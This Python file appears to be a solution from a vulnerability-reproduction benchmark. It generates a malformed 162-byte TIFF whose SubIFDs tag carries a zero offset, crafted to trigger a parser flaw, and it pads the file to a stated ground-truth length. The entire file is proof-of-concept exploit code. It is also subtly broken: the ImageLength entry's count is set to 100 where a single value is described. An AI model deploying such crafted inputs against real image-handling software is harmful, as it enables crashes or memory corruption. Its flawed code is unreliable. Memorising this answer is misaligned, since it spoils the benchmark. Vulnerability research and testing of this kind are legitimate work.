import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a minimal TIFF file with invalid offline tags having zero offset
        # We'll create a baseline TIFF with stripped format
        
        # TIFF header (little-endian)
        tiff_data = bytearray()
        tiff_data.extend(b'II')          # Little-endian
        tiff_data.extend(struct.pack('<H', 42))  # TIFF version
        tiff_data.extend(struct.pack('<I', 8))   # Offset to first IFD
        
        # First IFD starts at offset 8
        # We'll create tags that trigger the vulnerability
        
        # Create Image File Directory (IFD)
        ifd_offset = 8
        
        # We need tags with type 13 (IFD) which are "offline" tags
        # These tags have value offsets pointing to another IFD
        # Setting offset to 0 should trigger the vulnerability
        
        # Number of directory entries
        num_entries = 3
        tiff_data[ifd_offset:ifd_offset+2] = struct.pack('<H', num_entries)
        
        current_pos = ifd_offset + 2
        
        # Tag 1: ImageWidth (required baseline tag)
        tiff_data.extend(struct.pack('<H', 256))  # Tag: ImageWidth
        tiff_data.extend(struct.pack('<H', 4))    # Type: LONG
        tiff_data.extend(struct.pack('<I', 1))    # Count
        tiff_data.extend(struct.pack('<I', 100))  # Value: width=100
        
        # Tag 2: ImageLength (required baseline tag)
        tiff_data.extend(struct.pack('<H', 257))  # Tag: ImageLength
        tiff_data.extend(struct.pack('<H', 4))    # Type: LONG
        tiff_data.extend(struct.pack('<I', 100))  # Count
        tiff_data.extend(struct.pack('<I', 100))  # Value: height=100
        
        # Tag 3: SubIFDs tag (type 330) - this is an "offline" tag
        # We set count to 1 and offset to 0 to trigger the vulnerability
        tiff_data.extend(struct.pack('<H', 330))  # Tag: SubIFDs
        tiff_data.extend(struct.pack('<H', 13))   # Type: IFD (value 13)
        tiff_data.extend(struct.pack('<I', 1))    # Count: 1 sub-IFD
        tiff_data.extend(struct.pack('<I', 0))    # Offset: ZERO - vulnerable!
        
        # Offset to next IFD (0 means no more IFDs)
        tiff_data.extend(struct.pack('<I', 0))
        
        # Pad to reach exactly 162 bytes (ground-truth length)
        # Add some dummy data to reach exact length
        target_length = 162
        while len(tiff_data) < target_length:
            tiff_data.append(0)
        
        return bytes(tiff_data)